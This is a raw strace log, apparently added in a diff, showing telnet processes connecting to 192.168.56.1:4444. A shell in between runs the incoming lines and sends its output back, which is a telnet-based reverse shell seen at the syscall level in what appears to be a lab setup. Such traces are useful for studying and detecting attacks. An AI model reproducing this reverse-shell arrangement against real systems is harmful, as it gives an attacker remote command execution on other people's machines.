+[pid  4975] 15:03:28.975273 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\31\0\000"..., 512) = 512
+[pid  4975] 15:03:28.975294 fstat64(5, {st_mode=S_IFREG|0644, st_size=42700, ...}) = 0
+[pid  4975] 15:03:28.975326 mmap2(NULL, 41700, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7e7e000
+[pid  4975] 15:03:28.975338 mmap2(0xb7e88000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0xa) = 0xb7e88000
+[pid  4975] 15:03:28.975353 close(5)    = 0
+[pid  4975] 15:03:28.975366 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4975] 15:03:28.975383 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 5
+[pid  4975] 15:03:28.975402 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  4975] 15:03:28.975422 fstat64(5, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  4975] 15:03:28.975455 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d2f000
+[pid  4975] 15:03:28.975466 mmap2(0xb7e78000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x149 <unfinished ...>
+[pid  4972] 15:03:28.980202 <... connect resumed> ) = 0
+[pid  4972] 15:03:28.980232 open("/etc/telnetrc", O_RDONLY) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.980265 open("(null)/.telnetrc", O_RDONLY) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.980290 write(1, "Trying 192.168.56.1...\nConnected"..., 76) = 76
+[pid  4972] 15:03:28.980312 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4972] 15:03:28.980327 rt_sigaction(SIGINT, {0x804f550, [INT], SA_RESTART}, {SIG_IGN}, 8) = 0
+[pid  4972] 15:03:28.980350 rt_sigaction(SIGQUIT, {0x804f500, [QUIT], SA_RESTART}, {SIG_IGN}, 8) = 0
+[pid  4972] 15:03:28.980371 rt_sigaction(SIGWINCH, {0x804f4e0, [WINCH], SA_RESTART}, {SIG_IGN}, 8) = 0
+[pid  4972] 15:03:28.980392 rt_sigaction(SIGTSTP, {0x8053270, [TSTP], SA_RESTART}, {0x8053270, [TSTP], SA_RESTART}, 8) = 0
+[pid  4972] 15:03:28.980415 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfadb234) = -1 EINVAL (Invalid argument)
+[pid  4972] 15:03:28.980428 ioctl(0, SNDCTL_TMR_STOP or TCSETSW, {B0 opost isig icanon echo ...}) = -1 EINVAL (Invalid argument)
+[pid  4972] 15:03:28.980450 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfadb234) = -1 EINVAL (Invalid argument)
+[pid  4972] 15:03:28.980460 ioctl(0, SNDCTL_TMR_START or TCSETS, {B0 opost isig icanon echo ...}) = -1 EINVAL (Invalid argument)
+[pid  4972] 15:03:28.980480 ioctl(0, FIONBIO, [1]) = 0
+[pid  4972] 15:03:28.980494 ioctl(1, FIONBIO, [1]) = 0
+[pid  4972] 15:03:28.980505 ioctl(5, FIONBIO, [1]) = 0
+[pid  4972] 15:03:28.980521 setsockopt(5, SOL_SOCKET, SO_OOBINLINE, [1], 4) = 0
+[pid  4972] 15:03:28.980536 select(6, [0 5], [], [5], {0, 0}) = 0 (Timeout)
+[pid  4972] 15:03:28.980556 select(6, [0 5], [], [5], NULL <unfinished ...>
+[pid  4974] 15:03:28.980569 <... read resumed> "T", 1) = 1
+[pid  4974] 15:03:28.980582 read(0, "r", 1) = 1
+[pid  4974] 15:03:28.980594 read(0, "y", 1) = 1
+[pid  4974] 15:03:28.980606 read(0, "i", 1) = 1
+[pid  4974] 15:03:28.980617 read(0, "n", 1) = 1
+[pid  4974] 15:03:28.980629 read(0, "g", 1) = 1
+[pid  4974] 15:03:28.980640 read(0, " ", 1) = 1
+[pid  4974] 15:03:28.980652 read(0, "1", 1) = 1
+[pid  4974] 15:03:28.980664 read(0, "9", 1) = 1
+[pid  4974] 15:03:28.980675 read(0, "2", 1) = 1
+[pid  4974] 15:03:28.980687 read(0, ".", 1) = 1
+[pid  4974] 15:03:28.980698 read(0, "1", 1) = 1
+[pid  4974] 15:03:28.980710 read(0, "6", 1) = 1
+[pid  4974] 15:03:28.980721 read(0, "8", 1) = 1
+[pid  4974] 15:03:28.980733 read(0, ".", 1) = 1
+[pid  4974] 15:03:28.980745 read(0, "5", 1) = 1
+[pid  4974] 15:03:28.980756 read(0, "6", 1) = 1
+[pid  4974] 15:03:28.980768 read(0, ".", 1) = 1
+[pid  4974] 15:03:28.980779 read(0, "1", 1) = 1
+[pid  4974] 15:03:28.980791 read(0, ".", 1) = 1
+[pid  4974] 15:03:28.980802 read(0, ".", 1) = 1
+[pid  4974] 15:03:28.980814 read(0, ".", 1) = 1
+[pid  4974] 15:03:28.980825 read(0, "\n", 1) = 1
+[pid  4974] 15:03:28.980884 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4974] 15:03:28.980922 stat64("/sbin/Trying", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.980941 stat64("/bin/Trying", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.980958 stat64("/usr/sbin/Trying", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.980977 stat64("/usr/bin/Trying", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.980998 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+[pid  4974] 15:03:28.981017 clone(Process 4976 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d566f8) = 4976
+[pid  4976] 15:03:28.981097 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4976] 15:03:28.981120 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4976] 15:03:28.981140 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4976] 15:03:28.981159 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4976] 15:03:28.981184 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4976] 15:03:28.981210 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4976] 15:03:28.981263 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  4976] 15:03:28.981423 write(2, "sh: line 1: Trying: command not "..., 38) = 38
+[pid  4976] 15:03:28.981522 exit_group(127) = ?
+Process 4976 detached
+[pid  4975] 15:03:28.981564 <... mmap2 resumed> ) = 0xb7e78000
+[pid  4975] 15:03:28.981577 mmap2(0xb7e7b000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e7b000
+[pid  4975] 15:03:28.981595 close(5)    = 0
+[pid  4975] 15:03:28.981614 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4975] 15:03:28.981634 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 5
+[pid  4975] 15:03:28.981656 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\000"..., 512) = 512
+[pid  4975] 15:03:28.981679 fstat64(5, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+[pid  4975] 15:03:28.981713 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d2b000
+[pid  4975] 15:03:28.981725 mmap2(0xb7d2d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x1) = 0xb7d2d000
+[pid  4975] 15:03:28.981745 close(5)    = 0
+[pid  4975] 15:03:28.981777 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d2a000
+[pid  4975] 15:03:28.981794 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d2a940, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  4975] 15:03:28.981879 mprotect(0xb7e78000, 4096, PROT_READ) = 0
+[pid  4975] 15:03:28.982152 mprotect(0xb7f97000, 12288, PROT_READ) = 0
+[pid  4975] 15:03:28.982193 munmap(0xb7fd2000, 29338) = 0
+[pid  4975] 15:03:28.982296 brk(0)      = 0x805d000
+[pid  4975] 15:03:28.982307 brk(0x8082000) = 0x8082000
+[pid  4975] 15:03:28.982348 rt_sigaction(SIGTSTP, {0x8053270, [TSTP], SA_RESTART}, {SIG_DFL}, 8) = 0
+[pid  4975] 15:03:28.982374 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa0aed8) = -1 EINVAL (Invalid argument)
+[pid  4975] 15:03:28.982395 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4975] 15:03:28.982425 socket(PF_NETLINK, SOCK_RAW, 0) = 5
+[pid  4975] 15:03:28.982445 bind(5, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 0
+[pid  4975] 15:03:28.982463 getsockname(5, {sa_family=AF_NETLINK, pid=4975, groups=00000000}, [12]) = 0
+[pid  4975] 15:03:28.982505 time(NULL)  = 1478462608
+[pid  4975] 15:03:28.982524 sendto(5, "\24\0\0\0\26\0\1\3\220\214\37X\0\0\0\0\0\0\0\0", 20, 0, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 20
+[pid  4975] 15:03:28.982556 recvmsg(5, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"0\0\0\0\24\0\2\0\220\214\37Xo\23\0\0\2\10\200\376\1\0\0"..., 4096}], msg_controllen=0, msg_flags=0}, 0) = 108
+[pid  4975] 15:03:28.982597 recvmsg(5, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"@\0\0\0\24\0\2\0\220\214\37Xo\23\0\0\n\200\200\376\1\0"..., 4096}], msg_controllen=0, msg_flags=0}, 0) = 128
+[pid  4975] 15:03:28.982635 recvmsg(5, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"\24\0\0\0\3\0\2\0\220\214\37Xo\23\0\0\0\0\0\0\1\0\0\0\24"..., 4096}], msg_controllen=0, msg_flags=0}, 0) = 20
+[pid  4975] 15:03:28.982667 close(5)    = 0
+[pid  4975] 15:03:28.982714 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
+[pid  4975] 15:03:28.982761 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa0a288) = -1 ENOTTY (Inappropriate ioctl for device)
+[pid  4975] 15:03:28.982786 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd9000
+[pid  4975] 15:03:28.982832 close(-1)   = -1 EBADF (Bad file descriptor)
+[pid  4975] 15:03:28.982848 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 5
+[pid  4975] 15:03:28.982876 setsockopt(5, SOL_IP, IP_TOS, [16], 4) = 0
+[pid  4975] 15:03:28.982892 connect(5, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.56.1")}, 16) = 0
+[pid  4975] 15:03:28.983122 open("/etc/telnetrc", O_RDONLY) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:29.022338 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
+[pid  4975] 15:03:29.022384 open("(null)/.telnetrc", O_RDONLY <unfinished ...>
+[pid  4974] 15:03:29.022398 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  4975] 15:03:29.022409 <... open resumed> ) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:29.022416 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  4975] 15:03:29.022443 write(1, "Trying 192.168.56.1...\nConnected"..., 76 <unfinished ...>
+[pid  4974] 15:03:29.022459 waitpid(-1,  <unfinished ...>
+[pid  4975] 15:03:29.022470 <... write resumed> ) = 76
+[pid  4974] 15:03:29.022475 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 4976
+[pid  4975] 15:03:29.022486 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
+[pid  4974] 15:03:29.022492 waitpid(-1,  <unfinished ...>
+[pid  4975] 15:03:29.022500 <... rt_sigprocmask resumed> [], 8) = 0
+[pid  4974] 15:03:29.022508 <... waitpid resumed> 0xbffb9db8, WNOHANG) = -1 ECHILD (No child processes)
+[pid  4975] 15:03:29.022517 rt_sigaction(SIGINT, {0x804f550, [INT], SA_RESTART},  <unfinished ...>
+[pid  4974] 15:03:29.022531 sigreturn( <unfinished ...>
+[pid  4975] 15:03:29.022558 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:29.022567 <... sigreturn resumed> ) = ? (mask now [])
+[pid  4975] 15:03:29.022587 rt_sigaction(SIGQUIT, {0x804f500, [QUIT], SA_RESTART},  <unfinished ...>
+[pid  4974] 15:03:29.022600 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  4975] 15:03:29.022610 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:29.022620 <... rt_sigprocmask resumed> [], 8) = 0
+[pid  4975] 15:03:29.022631 rt_sigaction(SIGWINCH, {0x804f4e0, [WINCH], SA_RESTART},  <unfinished ...>
+[pid  4974] 15:03:29.022643 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
+[pid  4975] 15:03:29.022653 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:29.022663 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  4975] 15:03:29.022672 rt_sigaction(SIGTSTP, {0x8053270, [TSTP], SA_RESTART},  <unfinished ...>
+[pid  4974] 15:03:29.022683 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  4975] 15:03:29.022693 <... rt_sigaction resumed> {0x8053270, [TSTP], SA_RESTART}, 8) = 0
+[pid  4974] 15:03:29.022704 <... rt_sigprocmask resumed> [], 8) = 0
+[pid  4975] 15:03:29.022716 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
+[pid  4974] 15:03:29.022724 rt_sigaction(SIGINT, {0x807f150, [], 0},  <unfinished ...>
+[pid  4975] 15:03:29.022737 <... ioctl resumed> , 0xbfa0a964) = -1 EINVAL (Invalid argument)
+[pid  4974] 15:03:29.022743 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  4975] 15:03:29.022755 ioctl(0, SNDCTL_TMR_STOP or TCSETSW <unfinished ...>
+[pid  4974] 15:03:29.022761 rt_sigaction(SIGINT, {SIG_IGN},  <unfinished ...>
+[pid  4975] 15:03:29.022773 <... ioctl resumed> , {B0 opost isig icanon echo ...}) = -1 EINVAL (Invalid argument)
+[pid  4974] 15:03:29.022787 <... rt_sigaction resumed> {0x807f150, [], 0}, 8) = 0
+[pid  4975] 15:03:29.022807 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
+[pid  4974] 15:03:29.022822 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
+[pid  4975] 15:03:29.022833 <... ioctl resumed> , 0xbfa0a964) = -1 EINVAL (Invalid argument)
+[pid  4974] 15:03:29.022838 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  4975] 15:03:29.022846 ioctl(0, SNDCTL_TMR_START or TCSETS <unfinished ...>
+[pid  4974] 15:03:29.022852 rt_sigaction(SIGINT, {SIG_IGN},  <unfinished ...>
+[pid  4975] 15:03:29.022864 <... ioctl resumed> , {B0 opost isig icanon echo ...}) = -1 EINVAL (Invalid argument)
+[pid  4974] 15:03:29.022877 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  4975] 15:03:29.022892 ioctl(0, FIONBIO <unfinished ...>
+[pid  4974] 15:03:29.022899 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
+[pid  4975] 15:03:29.022906 <... ioctl resumed> , [1]) = 0
+[pid  4974] 15:03:29.022912 <... rt_sigprocmask resumed> [], 8) = 0
+[pid  4975] 15:03:29.022924 ioctl(1, FIONBIO <unfinished ...>
+[pid  4974] 15:03:29.022930 read(0,  <unfinished ...>
+[pid  4975] 15:03:29.022939 <... ioctl resumed> , [1]) = 0
+[pid  4974] 15:03:29.022945 <... read resumed> "C", 1) = 1
+[pid  4975] 15:03:29.022954 ioctl(5, FIONBIO <unfinished ...>
+[pid  4974] 15:03:29.022960 read(0,  <unfinished ...>
+[pid  4975] 15:03:29.022968 <... ioctl resumed> , [1]) = 0
+[pid  4974] 15:03:29.022974 <... read resumed> "o", 1) = 1
+[pid  4975] 15:03:29.022987 setsockopt(5, SOL_SOCKET, SO_OOBINLINE, [1], 4 <unfinished ...>
+[pid  4974] 15:03:29.022995 read(0,  <unfinished ...>
+[pid  4975] 15:03:29.023004 <... setsockopt resumed> ) = 0
+[pid  4974] 15:03:29.023009 <... read resumed> "n", 1) = 1
+[pid  4975] 15:03:29.023019 select(6, [0 5], [], [5], {0, 0} <unfinished ...>
+[pid  4974] 15:03:29.023033 read(0,  <unfinished ...>
+[pid  4975] 15:03:29.023042 <... select resumed> ) = 1 (in [0], left {0, 0})
+[pid  4974] 15:03:29.023052 <... read resumed> "n", 1) = 1
+[pid  4975] 15:03:29.023061 read(0,  <unfinished ...>
+[pid  4974] 15:03:29.023067 read(0,  <unfinished ...>
+[pid  4975] 15:03:29.023076 <... read resumed> "sh: line 1: Trying: command not "..., 8191) = 38
+[pid  4974] 15:03:29.023089 <... read resumed> "e", 1) = 1
+[pid  4975] 15:03:29.023099 select(6, [0 5], [5], [5], {0, 0} <unfinished ...>
+[pid  4974] 15:03:29.023111 read(0,  <unfinished ...>
+[pid  4975] 15:03:29.023119 <... select resumed> ) = 1 (out [5], left {0, 0})
+[pid  4974] 15:03:29.023129 <... read resumed> "c", 1) = 1
+[pid  4975] 15:03:29.023143 send(5, "sh: line 1: Trying: command not "..., 39, 0 <unfinished ...>
+[pid  4974] 15:03:29.023158 read(0,  <unfinished ...>
+[pid  4975] 15:03:29.023246 <... send resumed> ) = 39
+[pid  4974] 15:03:29.023253 <... read resumed> "t", 1) = 1
+[pid  4975] 15:03:29.023263 select(6, [0 5], [], [5], {0, 0} <unfinished ...>
+[pid  4974] 15:03:29.023275 read(0,  <unfinished ...>
+[pid  4975] 15:03:29.023284 <... select resumed> ) = 0 (Timeout)
+[pid  4974] 15:03:29.023288 <... read resumed> "e", 1) = 1
+[pid  4975] 15:03:29.023297 select(6, [0 5], [], [5], NULL <unfinished ...>
+[pid  4974] 15:03:29.023307 read(0, "d", 1) = 1
+[pid  4974] 15:03:29.023320 read(0, " ", 1) = 1
+[pid  4974] 15:03:29.023331 read(0, "t", 1) = 1
+[pid  4974] 15:03:29.023343 read(0, "o", 1) = 1
+[pid  4974] 15:03:29.023355 read(0, " ", 1) = 1
+[pid  4974] 15:03:29.023366 read(0, "1", 1) = 1
+[pid  4974] 15:03:29.023378 read(0, "9", 1) = 1
+[pid  4974] 15:03:29.023389 read(0, "2", 1) = 1
+[pid  4974] 15:03:29.023401 read(0, ".", 1) = 1
+[pid  4974] 15:03:29.023412 read(0, "1", 1) = 1
+[pid  4974] 15:03:29.023424 read(0, "6", 1) = 1
+[pid  4974] 15:03:29.023436 read(0, "8", 1) = 1
+[pid  4974] 15:03:29.023447 read(0, ".", 1) = 1
+[pid  4974] 15:03:29.023459 read(0, "5", 1) = 1
+[pid  4974] 15:03:29.023470 read(0, "6", 1) = 1
+[pid  4974] 15:03:29.023482 read(0, ".", 1) = 1
+[pid  4974] 15:03:29.023494 read(0, "1", 1) = 1
+[pid  4974] 15:03:29.023505 read(0, ".", 1) = 1
+[pid  4974] 15:03:29.023517 read(0, "\n", 1) = 1
+[pid  4974] 15:03:29.023545 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4974] 15:03:29.023583 stat64("/sbin/Connected", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:29.023710 stat64("/bin/Connected", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:29.023729 stat64("/usr/sbin/Connected", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:29.023748 stat64("/usr/bin/Connected", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:29.023768 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+[pid  4974] 15:03:29.023786 clone(Process 4977 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d566f8) = 4977
+[pid  4977] 15:03:29.023865 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4977] 15:03:29.023889 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4977] 15:03:29.023909 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4977] 15:03:29.023928 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4977] 15:03:29.023954 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4977] 15:03:29.023979 rt_sigaction(SIGQUIT, {SIG_IGN},  <unfinished ...>
+[pid  4974] 15:03:29.059555 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
+[pid  4977] 15:03:29.059772 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:29.059820 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  4977] 15:03:29.059892 rt_sigaction(SIGCHLD, {SIG_DFL},  <unfinished ...>
+[pid  4974] 15:03:29.059909 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  4977] 15:03:29.059930 <... rt_sigaction resumed> {0x807e540, [], 0}, 8) = 0
+[pid  4974] 15:03:29.059944 <... rt_sigprocmask resumed> [], 8) = 0
+[pid  4977] 15:03:29.060080 write(2, "sh: line 2: Connected: command n"..., 41 <unfinished ...>
+[pid  4974] 15:03:29.060097 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
+[pid  4975] 15:03:29.060113 <... select resumed> ) = 1 (in [0])
+[pid  4977] 15:03:29.060121 <... write resumed> ) = 41
+[pid  4974] 15:03:29.060125 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  4975] 15:03:29.060217 read(0,  <unfinished ...>
+[pid  4977] 15:03:29.060224 exit_group(127) = ?
+Process 4977 detached
+[pid  4974] 15:03:29.060231 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  4975] 15:03:29.060275 <... read resumed> "sh: line 2: Connected: command n"..., 8154) = 41
+[pid  4974] 15:03:29.060290 <... rt_sigprocmask resumed> [], 8) = 0
+[pid  4975] 15:03:29.060302 select(6, [0 5], [5], [5], {0, 0} <unfinished ...>
+[pid  4974] 15:03:29.060316 rt_sigaction(SIGINT, {0x807f150, [], 0},  <unfinished ...>
+[pid  4975] 15:03:29.060330 <... select resumed> ) = 1 (out [5], left {0, 0})
+[pid  4974] 15:03:29.060341 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  4975] 15:03:29.060359 send(5, "sh: line 2: Connected: command n"..., 42, 0 <unfinished ...>
+[pid  4974] 15:03:29.060374 rt_sigaction(SIGINT, {SIG_IGN},  <unfinished ...>
+[pid  4975] 15:03:29.060466 <... send resumed> ) = 42
+[pid  4974] 15:03:29.060473 <... rt_sigaction resumed> {0x807f150, [], 0}, 8) = 0
+[pid  4975] 15:03:29.060489 select(6, [0 5], [], [5], {0, 0} <unfinished ...>
+[pid  4974] 15:03:29.060501 waitpid(-1,  <unfinished ...>
+[pid  4975] 15:03:29.060513 <... select resumed> ) = 0 (Timeout)
+[pid  4974] 15:03:29.060518 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], 0) = 4977
+[pid  4975] 15:03:29.060531 select(6, [0 5], [], [5], NULL <unfinished ...>
+[pid  4974] 15:03:29.060541 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4974] 15:03:29.060555 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  4974] 15:03:29.060564 waitpid(-1, 0xbffb9e28, WNOHANG) = -1 ECHILD (No child processes)
+[pid  4974] 15:03:29.060576 sigreturn() = ? (mask now [])
+[pid  4974] 15:03:29.060606 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:29.060628 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4974] 15:03:29.060643 read(0, "E", 1) = 1
+[pid  4974] 15:03:29.060657 read(0, "s", 1) = 1
+[pid  4974] 15:03:29.060669 read(0, "c", 1) = 1
+[pid  4974] 15:03:29.060680 read(0, "a", 1) = 1
+[pid  4974] 15:03:29.060692 read(0, "p", 1) = 1
+[pid  4974] 15:03:29.060704 read(0, "e", 1) = 1
+[pid  4974] 15:03:29.060715 read(0, " ", 1) = 1
+[pid  4974] 15:03:29.060727 read(0, "c", 1) = 1
+[pid  4974] 15:03:29.060739 read(0, "h", 1) = 1
+[pid  4974] 15:03:29.060751 read(0, "a", 1) = 1
+[pid  4974] 15:03:29.060762 read(0, "r", 1) = 1
+[pid  4974] 15:03:29.060774 read(0, "a", 1) = 1
+[pid  4974] 15:03:29.060786 read(0, "c", 1) = 1
+[pid  4974] 15:03:29.060797 read(0, "t", 1) = 1
+[pid  4974] 15:03:29.060809 read(0, "e", 1) = 1
+[pid  4974] 15:03:29.060820 read(0, "r", 1) = 1
+[pid  4974] 15:03:29.060832 read(0, " ", 1) = 1
+[pid  4974] 15:03:29.060844 read(0, "i", 1) = 1
+[pid  4974] 15:03:29.060855 read(0, "s", 1) = 1
+[pid  4974] 15:03:29.060867 read(0, " ", 1) = 1
+[pid  4974] 15:03:29.060879 read(0, "\'", 1) = 1
+[pid  4974] 15:03:29.060891 read(0, "^", 1) = 1
+[pid  4974] 15:03:29.060902 read(0, "]", 1) = 1
+[pid  4974] 15:03:29.060914 read(0, "\'", 1) = 1
+[pid  4974] 15:03:29.060926 read(0, ".", 1) = 1
+[pid  4974] 15:03:29.060937 read(0, "\n", 1) = 1
+[pid  4974] 15:03:29.060968 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4974] 15:03:29.061006 stat64("/sbin/Escape", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:29.061026 stat64("/bin/Escape", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:29.061043 stat64("/usr/sbin/Escape", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:29.061062 stat64("/usr/bin/Escape", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:29.061079 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+[pid  4974] 15:03:29.061097 clone(Process 4978 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d566f8) = 4978
+[pid  4978] 15:03:29.061166 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4978] 15:03:29.061188 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4978] 15:03:29.061208 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4978] 15:03:29.061247 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4978] 15:03:29.061282 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4978] 15:03:29.061316 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4978] 15:03:29.061336 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  4978] 15:03:29.061441 write(2, "sh: line 3: Escape: command not "..., 38 <unfinished ...>
+[pid  4975] 15:03:29.061459 <... select resumed> ) = 1 (in [0])
+[pid  4978] 15:03:29.061466 <... write resumed> ) = 38
+[pid  4975] 15:03:29.061579 read(0,  <unfinished ...>
+[pid  4978] 15:03:29.061585 exit_group(127) = ?
+Process 4978 detached
+[pid  4975] 15:03:29.061616 <... read resumed> "sh: line 3: Escape: command not "..., 8113) = 38
+[pid  4975] 15:03:29.061634 select(6, [0 5], [5], [5], {0, 0}) = 1 (out [5], left {0, 0})
